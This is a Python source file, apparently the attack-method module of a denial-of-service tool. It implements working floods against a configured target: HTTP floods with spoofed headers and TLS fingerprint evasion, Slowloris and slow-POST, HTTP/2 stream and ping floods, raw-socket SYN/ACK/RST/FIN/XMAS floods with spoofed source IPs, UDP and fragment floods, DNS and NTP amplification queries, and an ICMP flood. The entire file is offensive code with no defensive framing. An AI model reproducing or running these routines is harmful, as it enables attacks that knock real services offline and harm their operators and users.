#!/usr/bin/env python

import os
import random
import socket
import struct
import time
from time import sleep
from lib.core.Fingerprint import Fingerprint
from lib.core.Random import RandomGenerator

try:
    import h2.config
    import h2.connection

    HasH2 = True
except ImportError:
    HasH2 = False

try:
    import asyncio
    from aioquic.asyncio.client import connect
    from aioquic.h3.connection import H3_ALPN
    from aioquic.quic.configuration import QuicConfiguration

    HasH3 = True
except ImportError:
    HasH3 = False


class Methods:
    def __init__(self, Config):
        self.IP = Config.get("IP")
        self.Port = Config.get("Port")
        self.Host = Config.get("Host")
        self.Path = Config.get("Path")
        self.Scheme = Config.get("Scheme")
        self.Protocol = Config.get("Protocol")
        self.JAProfile = Config.get("JAProfile")
        self.UserAgents = Config.get("UserAgents")
        self.Referers = Config.get("Referers")
        self.Method = Config.get("Method")
        self.Running = Config.get("Running")
        self.RequestsCount = Config.get("RequestsCount")
        self.BytesSent = Config.get("BytesSent")
        self.StatsLock = Config.get("StatsLock")

    def HTTPExecutor(self, ExecutorID):
        LocalCount = 0
        LocalBytes = 0
        HTTPMethodsList = {
            "GET": "GET",
            "POST": "POST",
            "PUT": "PUT",
            "HEAD": "HEAD",
            "DELETE": "DELETE",
            "PATCH": "PATCH",
            "OPTIONS": "OPTIONS",
            "CONNECT": "CONNECT",
            "TRACE": "TRACE",
        }
        while self.Running.value:
            Sock = None
            try:
                Sock = Fingerprint.CreateJa3Socket(
                    self.IP,
                    self.Port,
                    self.Scheme,
                    self.Host,
                    self.Protocol,
                    self.JAProfile,
                )
                if not Sock:
                    continue
                for _ in range(500):
                    if not self.Running.value:
                        break
                    try:
                        if self.Method == "RANDOM":
                            CurrentMethod = random.choice(
                                list(HTTPMethodsList.values())
                            )
                        else:
                            CurrentMethod = HTTPMethodsList.get(self.Method, "GET")
                        UserAgent = random.choice(self.UserAgents)
                        Referer = random.choice(self.Referers)
                        PathQuery = f"{self.Path}?={int(time.time() * 1000000)}&{RandomGenerator.RandomString(8)}"
                        Request = f"{CurrentMethod} {PathQuery} HTTP/1.1\r\n"
                        Request += f"Host: {self.Host}\r\n"
                        Request += f"User-Agent: {UserAgent}\r\n"
                        Request += "Accept: */*\r\n"
                        Request += f"Referer: {Referer}\r\n"
                        Request += f"X-Forwarded-For: {RandomGenerator.RandomIP()}\r\n"
                        Request += "Connection: keep-alive\r\n"
                        if CurrentMethod in ["POST", "PUT", "PATCH"]:
                            Body = ("X" * 65536).encode()
                            Request += f"Content-Length: {len(Body)}\r\n\r\n"
                            Payload = Request.encode() + Body
                        else:
                            Request += "\r\n"
                            Payload = Request.encode()
                        Sock.sendall(Payload)
                        LocalCount += 1
                        LocalBytes += len(Payload)
                        try:
                            Sock.settimeout(0.0001)
                            Sock.recv(16384)
                        except Exception:
                            pass
                    except Exception:
                        break
                if LocalCount > 0:
                    with self.StatsLock:
                        self.RequestsCount.value += LocalCount
                        self.BytesSent.value += LocalBytes
                    LocalCount = 0
                    LocalBytes = 0
            except Exception:
                pass
            finally:
                if Sock:
                    try:
                        Sock.close()
                    except Exception:
                        pass

    def SlowlorisExecutor(self, ExecutorID):
        Connections = []
        for _ in range(200):
            try:
                Sock = Fingerprint.CreateJa3Socket(
                    self.IP,
                    self.Port,
                    self.Scheme,
                    self.Host,
                    self.Protocol,
                    self.JAProfile,
                )
                if Sock:
                    Sock.sendall(
                        f"GET {self.Path} HTTP/1.1\r\nHost: {self.Host}\r\n".encode()
                    )
                    Connections.append(Sock)
            except Exception:
                pass
        while self.Running.value:
            for Sock in Connections[:]:
                try:
                    Sock.sendall(
                        f"X-{RandomGenerator.RandomString(5)}: {RandomGenerator.RandomString(10)}\r\n".encode()
                    )
                    with self.StatsLock:
                        self.RequestsCount.value += 1
                except Exception:
                    Connections.remove(Sock)
            sleep(10)

    def SlowPostExecutor(self, ExecutorID):
        Connections = []
        for _ in range(100):
            try:
                Sock = Fingerprint.CreateJa3Socket(
                    self.IP,
                    self.Port,
                    self.Scheme,
                    self.Host,
                    self.Protocol,
                    self.JAProfile,
                )
                if Sock:
                    RequestData = f"POST {self.Path} HTTP/1.1\r\nHost: {self.Host}\r\nContent-Length: 999999999\r\n\r\n"
                    Sock.sendall(RequestData.encode())
                    Connections.append(Sock)
            except Exception:
                pass
        while self.Running.value:
            for Sock in Connections[:]:
                try:
                    Sock.sendall(RandomGenerator.RandomString(1).encode())
                except Exception:
                    Connections.remove(Sock)
            sleep(1)

    def H2Executor(self, ExecutorID):
        if not HasH2:
            return
        LocalCount = 0
        LocalBytes = 0
        while self.Running.value:
            Sock = None
            H2Connection = None
            try:
                Sock = Fingerprint.CreateJa3Socket(
                    self.IP,
                    self.Port,
                    self.Scheme,
                    self.Host,
                    self.Protocol,
                    self.JAProfile,
                )
                if not Sock:
                    continue
                if self.Scheme == "https" and Sock.selected_alpn_protocol() != "h2":
                    Sock.close()
                    continue
                H2Config = h2.config.H2Configuration(client_side=True)
                H2Connection = h2.connection.H2Connection(config=H2Config)
                H2Connection.initiate_connection()
                H2Connection.increment_flow_control_window(15663105)
                Sock.sendall(H2Connection.data_to_send())
                for StreamID in range(1, 513, 2):
                    if not self.Running.value:
                        break
                    try:
                        H2Connection.prioritize(StreamID, weight=random.randint(1, 256))
                        Headers = [
                            (":method", "POST" if "POST" in self.Method else "GET"),
                            (":scheme", self.Scheme),
                            (":authority", self.Host),
                            (
                                ":path",
                                f"{self.Path}?s={StreamID}&={int(time.time() * 1000000)}",
                            ),
                            ("user-agent", random.choice(self.UserAgents)),
                            ("referer", random.choice(self.Referers)),
                        ]
                        H2Connection.send_headers(StreamID, Headers)
                        if "POST" in self.Method:
                            Body = os.urandom(65536)
                            H2Connection.send_data(StreamID, Body)
                            LocalBytes += len(Body)
                        H2Connection.end_stream(StreamID)
                        if StreamID % 32 == 1:
                            Data = H2Connection.data_to_send()
                            if Data:
                                Sock.sendall(Data)
                                LocalBytes += len(Data)
                        LocalCount += 1
                    except Exception:
                        break
                if LocalCount > 0:
                    with self.StatsLock:
                        self.RequestsCount.value += LocalCount
                        self.BytesSent.value += LocalBytes
                    LocalCount = 0
                    LocalBytes = 0
            except Exception:
                pass
            finally:
                if H2Connection:
                    try:
                        H2Connection.close_connection()
                    except Exception:
                        pass
                if Sock:
                    try:
                        Sock.close()
                    except Exception:
                        pass

    def H2PingExecutor(self, ExecutorID):
        if not HasH2:
            return
        while self.Running.value:
            Sock = None
            H2Connection = None
            try:
                Sock = Fingerprint.CreateJa3Socket(
                    self.IP,
                    self.Port,
                    self.Scheme,
                    self.Host,
                    self.Protocol,
                    self.JAProfile,
                )
                if not Sock:
                    continue
                H2Config = h2.config.H2Configuration(client_side=True)
                H2Connection = h2.connection.H2Connection(config=H2Config)
                H2Connection.initiate_connection()
                Sock.sendall(H2Connection.data_to_send())
                for _ in range(1000):
                    if not self.Running.value:
                        break
                    try:
                        H2Connection.ping(os.urandom(8))
                        Data = H2Connection.data_to_send()
                        if Data:
                            Sock.sendall(Data)
                        with self.StatsLock:
                            self.RequestsCount.value += 1
                    except Exception:
                        break
            except Exception:
                pass

    def TCPExecutor(self, ExecutorID):
        LocalCount = 0
        while self.Running.value:
            try:
                Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                Sock.settimeout(2)
                Sock.connect((self.IP, self.Port))
                Sock.sendall(os.urandom(2048))
                LocalCount += 1
                if LocalCount >= 100:
                    with self.StatsLock:
                        self.RequestsCount.value += LocalCount
                    LocalCount = 0
                Sock.close()
            except Exception:
                pass

    def SYNExecutor(self, ExecutorID):
        try:
            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = RandomGenerator.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    2,
                    8192,
                    0,
                    0,
                )
                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def ACKExecutor(self, ExecutorID):
        try:
            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = RandomGenerator.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    16,
                    8192,
                    0,
                    0,
                )
                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def RSTExecutor(self, ExecutorID):
        try:
            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = RandomGenerator.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    4,
                    8192,
                    0,
                    0,
                )
                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def FINExecutor(self, ExecutorID):
        try:
            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = RandomGenerator.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    1,
                    8192,
                    0,
                    0,
                )
                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def XMASExecutor(self, ExecutorID):
        try:
            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = RandomGenerator.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    41,
                    8192,
                    0,
                    0,
                )
                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def UDPExecutor(self, ExecutorID):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        LocalCount = 0
        LocalBytes = 0
        while self.Running.value:
            try:
                Data = os.urandom(65507)
                Sock.sendto(Data, (self.IP, self.Port))
                LocalCount += 1
                LocalBytes += len(Data)
                if LocalCount >= 500:
                    with self.StatsLock:
                        self.RequestsCount.value += LocalCount
                        self.BytesSent.value += LocalBytes
                    LocalCount = 0
                    LocalBytes = 0
            except Exception:
                pass

    def UDPFragExecutor(self, ExecutorID):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.Running.value:
            try:
                for I in range(10):
                    Fragment = os.urandom(8192)
                    Sock.sendto(Fragment, (self.IP, self.Port))
                with self.StatsLock:
                    self.RequestsCount.value += 10
            except Exception:
                pass

    def DNSAmpExecutor(self, ExecutorID):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        DNSQuery = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        DNSQuery += b"\x03www\x06google\x03com\x00\x00\xff\x00\x01"
        while self.Running.value:
            try:
                Sock.sendto(DNSQuery, (self.IP, self.Port))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def NTPAmpExecutor(self, ExecutorID):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        NTPQuery = b"\x17\x00\x03\x2a" + b"\x00" * 4
        while self.Running.value:
            try:
                Sock.sendto(NTPQuery, (self.IP, self.Port))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def ICMPExecutor(self, ExecutorID):
        try:
            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                PacketID = random.randint(1, 65535)
                Header = struct.pack("!BBHHH", 8, 0, 0, PacketID, 1)
                Data = os.urandom(2048)
                Checksum = RandomGenerator.CalculateChecksum(Header + Data)
                Header = struct.pack(
                    "!BBHHH", 8, 0, socket.htons(Checksum), PacketID, 1
                )
                Sock.sendto(Header + Data, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
                    self.BytesSent.value += len(Header + Data)
            except Exception:
                pass
